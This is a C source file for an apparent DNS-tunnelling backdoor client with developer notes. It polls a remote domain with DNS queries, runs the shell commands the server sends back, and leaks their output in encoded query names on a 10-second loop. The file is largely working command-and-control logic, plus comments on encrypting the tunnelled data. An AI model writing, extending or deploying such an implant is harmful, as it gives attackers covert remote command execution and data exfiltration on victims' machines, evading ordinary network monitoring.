/*
 * main.c
 *
 *  Created on: Jan 17, 2016
 *      Author: joe
 */

#include <stdio.h>
#include <string.h> 	  	// strlen used in main here

#include "dns-protocol.h" 	// for using createDnsHeader here..
#include "bufferHelper.h"
#include "exec.h"
#include "sockets.h"
#include "dns-packet.h"
#include "linked-list.h"	// list definitions and structs

// new thoughts
/*
 * perhaps don't need a task qeueue unless we are waiting until all previous
 * tasks finish posting until de-queueing next task
 */

/*
 * discussion points for "heavy weight" vs. "light weight" implementations
 * of 'dns-client' while ensuring reliability and error detection and recovery.
 *
 * <1>
 * rfcQueryNameCreation - only necessary when domain names are not included
 * into program, one exception would be if the server sent a message that
 * contained a new domain to talk to, either this response would have to be
 * dns compliant, or we would have to leave in rfcQueryNameCreation.
 * </>
 *
 *
 * <2>
 * The main string parsing is really just appending the stdout bytes to
 * the "host" portion of the qname. The header would already be built,
 * ! static transaction id? ! --
 *
 * To recap, string operations on queries = appending stdout bytes, possibly
 * randomize transaction id, encoding query name, and possibly encrypting that
 * query name.
 *
 * String operations on query responses = Interpreting pre-selected fields
 * of the response, but typically just the query name portion after decoding
 * and optionally decrypting it.
 *
 * To retrieve response query name, implement light weight qname parser. *
 * </>
 *
 * <3>
 * To do, perl/python library for creating c code and a small but efficient
 * build/automation process..
 * <>
 *
 *
 * <4>
 * Go through error parsing handlers, perror vs manual? to return or not..
 * </>
 *
 * <5>
 * Regarding #1, do not use putChar/bufferhelper functions.. prebuilt strings?
 * </>
 *
 * <6> // scary
 * linked list implemented as a queue of jobs
 *
 */

// globals

unsigned char firstQuery[] = {
0x8c, 0x80, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77,
0x02, 0x68, 0x69, 0x03, 0x63, 0x6f, 0x6d, 0x00,
0x00, 0x01, 0x00, 0x01 };

// to modify the contents of a variable,
// you need to pass the address of it,

// if the variable is of type pointer to {data-type}
// you simple pass the address of this variable to modify it.

// when doing the above with functions, you have to have correct function
// signatures
// variable = pointer
// passing address of variable = passing address of variable whos contents = address
// aka passing a pointer to a "pointer"

// test data
unsigned char *domain = ".com.";
unsigned char *host   = "initial";
unsigned int napTime = 10;

void main(int argc, char *argv[])
{
	int stdoutBuffSize = 0, recvBuffSize = 0, sendBuffSize = 0, taskType = 0;
	unsigned char *recvBuff, *sendBuff, *stdoutBuff, *task;
	recvBuff = NULL;
	sendBuff = NULL;
	stdoutBuff = NULL;
	task = NULL;

	// create two linked list based queues
	struct NODE *taskQueueHead = NULL;
	struct NODE *stdoutListHead = NULL;
	struct NODE *curJob;
	// argv1 - "host portion"
	// argv2 - "domain"

	// send initial query and receive response
	// encrypt, encode, createPacket, sendPacket
	sendBuff = createDnsQueryPacket(MESSAGE_TYPE_HELLO, argv[1], domain, &sendBuffSize);
	recvBuff = sendQuery(sendBuff, sendBuffSize, &recvBuffSize);

	// create dns packet buffer
	while (1)
	{
		puts ("about to parse packet \n");

		// parse response
		struct DNS_RESPONSE_PACKET *drp = parseDnsResponse(recvBuff, recvBuffSize);

		// disect pre-selected fields based on protocol we designed
		struct CONTROL *ctrl = getControl(drp);

		//ctrl->messageType = 1;

		// decide what to do with response
		switch (ctrl->messageType)
		{
			/* ========================================================= */
			case MESSAGE_TYPE_NO_CMD: puts("case => MESSAGE_TYPE_NO_CMD");
				break;

			/* ========================================================= */
			case MESSAGE_TYPE_SHELL_CMD: puts("case => MESSAGE_TYPE_SHELL_CMD");

				//printControlFields(ctrl); exit(1);
			    // add shell command to task queue OR..
				// run command and add list of stdout to stdoutList
				//stdoutBuffSize = shellCommand(ctrl->message, &stdoutBuff);
				stdoutBuffSize = shellCommand(ctrl->message, &stdoutBuff);
				struct NODE *tempList = constructStdoutList(stdoutBuff, stdoutBuffSize);

				// empty out stdout list query names into stdoutListHead
				while(tempList->next != NULL)
				{
					enqueue(&stdoutListHead, tempList->data, tempList->dataLength);

					// walking the tempList of stdout, storing node in 'global' sdoutListHead
					tempList = tempList->next;
				}
				// tempList has no more nodes connected or just had 1 to begin
				enqueue(&stdoutListHead, tempList->data, tempList->dataLength);
				break;
			/* ========================================================= */

			default: puts("case => default");
				break;
		} // end switch


		/*
		 * ran command, added to stdoutList
		 *
		 *  now --> grab chunks and send.
		 */

		//printList(stdoutListHead);

		// NEED TO INVESTIGATE SIZE OF STDOUT LIST QUEUE EXACTLY
		// WHAT NODES ARE INSIDE IT, AND WHY CHUNK==NULL ..??
		//dequeue(&stdoutListHead);
		//dequeue(&stdoutListHead); exit(1);

		// now grab next chunk of output -- no necessarily from prev cmd
		curJob = dequeue(&stdoutListHead);
		if(curJob != NULL)
		{
			puts("chunk is not null");
			sendBuff = createDnsQueryPacket(MESSAGE_TYPE_CMD_OUTPUT,
												curJob ->data,
													domain,
														&sendBuffSize);

		}
		else
		{
			puts("chunk is null");
			sendBuff = createDnsQueryPacket(MESSAGE_TYPE_HELLO,
												"hellohellohello",
													domain,
														&sendBuffSize);
		}

		sleep(napTime);
		recvBuff = sendQuery(sendBuff, sendBuffSize, &recvBuffSize);

		// clear buffers
		memset(sendBuff, 0, sendBuffSize);

		// need to print
		// free malloc'd pointers
		//puts("free()'ing ");
		//if(drp!=NULL)
		//	free(drp);

		//if(drp->dnsQuestion.qname!=NULL)
		//	free(drp->dnsQuestion.qname);

		//if(ctrl!=NULL)
		//	free(ctrl);

		//if(ctrl->message!=NULL)
		//	free(ctrl->message);

	} // end while

	/*
	if (stdoutListHead != NULL)
		free(stdoutListHead);

	if(taskQueueHead != NULL)
		free(taskQueueHead);

	if (stdoutBuff != NULL)
		free(stdoutBuff);

	if (sendBuff != NULL)
		free(sendBuff);

	if (recvBuff != NULL)
		free(recvBuff);
	*/
}
